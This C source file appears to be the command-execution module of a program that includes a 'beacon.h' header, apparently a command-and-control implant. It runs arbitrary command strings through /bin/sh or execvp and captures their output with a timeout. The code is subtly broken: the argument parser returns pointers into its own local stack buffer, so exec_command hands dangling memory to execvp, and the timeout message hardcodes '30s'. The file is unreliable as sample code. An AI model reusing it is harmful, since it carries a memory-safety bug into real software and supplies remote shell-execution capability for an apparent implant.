#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <signal.h>
#include <sys/wait.h>
#include <sys/select.h>
#include <errno.h>
#include <time.h>
#include "exec.h"
#include "beacon.h"

/* ---- shared pipe/read loop used by both exec variants ---- */

static char *_exec_read_pipe(int pipefd_read, pid_t pid, size_t *out_len) {
    size_t buf_cap = 4096;
    size_t buf_len = 0;
    char *buf = malloc(buf_cap);
    if (!buf) { close(pipefd_read); *out_len = 0; return NULL; }

    struct timespec start;
    clock_gettime(CLOCK_MONOTONIC, &start);
    int timed_out = 0;

    for (;;) {
        struct timespec now;
        clock_gettime(CLOCK_MONOTONIC, &now);
        long elapsed = now.tv_sec - start.tv_sec;
        if (elapsed >= CMD_TIMEOUT_SEC) { timed_out = 1; break; }

        fd_set rfds;
        FD_ZERO(&rfds);
        FD_SET(pipefd_read, &rfds);
        struct timeval tv = { .tv_sec = 1, .tv_usec = 0 };

        int sel = select(pipefd_read + 1, &rfds, NULL, NULL, &tv);
        if (sel < 0 && errno == EINTR) continue;
        if (sel <= 0) continue;

        if (buf_len >= MAX_CMD_OUTPUT) break;

        size_t space = buf_cap - buf_len;
        if (space < 4096) {
            buf_cap *= 2;
            if (buf_cap > MAX_CMD_OUTPUT + 4096) buf_cap = MAX_CMD_OUTPUT + 4096;
            char *nb = realloc(buf, buf_cap);
            if (!nb) break;
            buf = nb;
            space = buf_cap - buf_len;
        }

        ssize_t n = read(pipefd_read, buf + buf_len, space);
        if (n <= 0) break;
        buf_len += (size_t)n;
    }

    if (timed_out) {
        kill(pid, SIGKILL);
        usleep(50000);
        waitpid(pid, NULL, WNOHANG);
        waitpid(pid, NULL, 0);
        const char *tmsg = "\n[command timed out after 30s]";
        size_t tlen = strlen(tmsg);
        if (buf_len + tlen < buf_cap) {
            memcpy(buf + buf_len, tmsg, tlen);
            buf_len += tlen;
        }
    } else {
        for (;;) {
            char tmp[4096];
            ssize_t n = read(pipefd_read, tmp, sizeof(tmp));
            if (n <= 0) break;
            if (buf_len + (size_t)n <= MAX_CMD_OUTPUT) {
                if (buf_len + (size_t)n > buf_cap) {
                    buf_cap = buf_len + (size_t)n + 1;
                    char *nb = realloc(buf, buf_cap);
                    if (nb) buf = nb; else break;
                }
                memcpy(buf + buf_len, tmp, n);
                buf_len += (size_t)n;
            }
        }
        waitpid(pid, NULL, 0);
    }

    close(pipefd_read);
    *out_len = buf_len;
    return buf;
}

/* ---- exec_command_shell: spawn /bin/sh -c <cmd> ---- */

char *exec_command_shell(const char *cmd, size_t *out_len) {
    int pipefd[2];
    if (pipe(pipefd) < 0) {
        char *err = strdup("fork failed: pipe error");
        *out_len = strlen(err);
        return err;
    }

    pid_t pid = fork();
    if (pid < 0) {
        close(pipefd[0]);
        close(pipefd[1]);
        char *err = strdup("fork failed");
        *out_len = strlen(err);
        return err;
    }

    if (pid == 0) {
        close(pipefd[0]);
        dup2(pipefd[1], STDOUT_FILENO);
        dup2(pipefd[1], STDERR_FILENO);
        close(pipefd[1]);
        execl("/bin/sh", "sh", "-c", cmd, (char *)NULL);
        _exit(127);
    }

    close(pipefd[1]);
    return _exec_read_pipe(pipefd[0], pid, out_len);
}

/* ---- exec_command: direct execvp (no shell) ---- */

/* Simple argv parser: splits on spaces, respects single and double quotes. */
static int _parse_argv(const char *cmd, char **argv, int max_args) {
    char buf[4096];
    strncpy(buf, cmd, sizeof(buf) - 1);
    buf[sizeof(buf) - 1] = '\0';

    int argc = 0;
    char *p = buf;

    while (*p && argc < max_args - 1) {
        /* skip leading spaces */
        while (*p == ' ' || *p == '\t') p++;
        if (!*p) break;

        char *token_start;
        char quote = 0;

        if (*p == '\'' || *p == '"') {
            quote = *p++;
            token_start = p;
            while (*p && *p != quote) p++;
            if (*p) *p++ = '\0';
        } else {
            token_start = p;
            while (*p && *p != ' ' && *p != '\t') p++;
            if (*p) *p++ = '\0';
        }

        argv[argc++] = token_start;
    }
    argv[argc] = NULL;
    return argc;
}

char *exec_command(const char *cmd, size_t *out_len) {
    char *argv[128];
    int argc = _parse_argv(cmd, argv, 128);

    if (argc == 0) {
        char *err = strdup("exec: empty command");
        *out_len = strlen(err);
        return err;
    }

    int pipefd[2];
    if (pipe(pipefd) < 0) {
        char *err = strdup("fork failed: pipe error");
        *out_len = strlen(err);
        return err;
    }

    pid_t pid = fork();
    if (pid < 0) {
        close(pipefd[0]);
        close(pipefd[1]);
        char *err = strdup("fork failed");
        *out_len = strlen(err);
        return err;
    }

    if (pid == 0) {
        close(pipefd[0]);
        dup2(pipefd[1], STDOUT_FILENO);
        dup2(pipefd[1], STDERR_FILENO);
        close(pipefd[1]);
        execvp(argv[0], argv);
        _exit(127);
    }

    close(pipefd[1]);
    return _exec_read_pipe(pipefd[0], pid, out_len);
}
